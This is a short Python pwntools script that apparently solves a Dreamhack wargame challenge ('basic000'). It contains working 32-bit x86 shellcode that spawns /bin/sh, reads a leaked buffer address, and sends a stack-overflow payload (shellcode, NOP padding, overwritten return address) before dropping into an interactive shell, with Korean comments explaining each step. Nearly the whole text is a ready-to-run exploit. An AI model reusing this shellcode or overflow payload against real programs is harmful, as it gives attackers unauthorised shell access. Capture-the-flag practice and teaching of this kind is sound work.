from pwn import *

p = process("./basic000")
#p = remote("host1.dreamhack.games", 10268)
 
context.log_level = "DEBUG"

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

buf = int(p.recv()[7:17], 16)	# 출력 데이터인 buf = (0xffffcfb8)에서 0xffffcfb8 (index: 7 ~ 17)만 16진수로 buf에 저장

payload = shellcode				# payload = shellcode[26]
payload += b"\x90"*106			# payload = shellcode[26] + NOP[106]
payload += p32(buf)				# payload = shellcode[26] + NOP[106] + buf_address[4]

p.sendline(payload)				# payload 입력
p.interactive()	 